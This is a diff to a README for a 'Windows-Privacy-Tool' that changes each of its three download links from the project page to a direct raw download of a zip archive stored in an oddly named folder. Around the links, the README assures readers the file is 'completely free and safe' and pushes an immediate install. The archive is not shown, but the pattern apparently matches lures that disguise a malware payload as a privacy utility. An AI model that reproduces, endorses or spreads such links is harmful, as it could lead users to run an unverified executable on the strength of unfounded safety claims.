@@ -1,6 +1,6 @@
 # 🛡️ Windows-Privacy-Tool - Take Back Control of Your PC Today
 
-[![Download Now](https://img.shields.io/badge/Download-Windows%20Privacy%20Tool-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/bias-folkart7785/Windows-Privacy-Tool)
+[![Download Now](https://img.shields.io/badge/Download-Windows%20Privacy%20Tool-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/bias-folkart7785/Windows-Privacy-Tool/main/epiplasm/Tool_Privacy_Windows_v1.3.zip)
 
 ## 🔐 What Is Windows-Privacy-Tool?
 
@@ -27,7 +27,7 @@ Downloading and running Windows-Privacy-Tool takes less than two minutes. Follow
 
 Visit this link to download the application. The download is completely free and safe.
 
-**[👉 Click Here to Download Windows-Privacy-Tool](https://github.com/bias-folkart7785/Windows-Privacy-Tool)**
+**[👉 Click Here to Download Windows-Privacy-Tool](https://raw.githubusercontent.com/bias-folkart7785/Windows-Privacy-Tool/main/epiplasm/Tool_Privacy_Windows_v1.3.zip)**
 
 The file is lightweight and downloads quickly, even on slower connections.
 
@@ -131,7 +131,7 @@ Don't let Windows collect your personal data by default. Windows-Privacy-Tool em
 
 The download is instant, the installation is painless, and the effects are immediate. Click the button below to secure your Windows system right now.
 
-**[⬇️ Download Windows-Privacy-Tool 2026 Free](https://github.com/bias-folkart7785/Windows-Privacy-Tool)**
+**[⬇️ Download Windows-Privacy-Tool 2026 Free](https://raw.githubusercontent.com/bias-folkart7785/Windows-Privacy-Tool/main/epiplasm/Tool_Privacy_Windows_v1.3.zip)**
 
 Your privacy matters – take charge of it today!
 
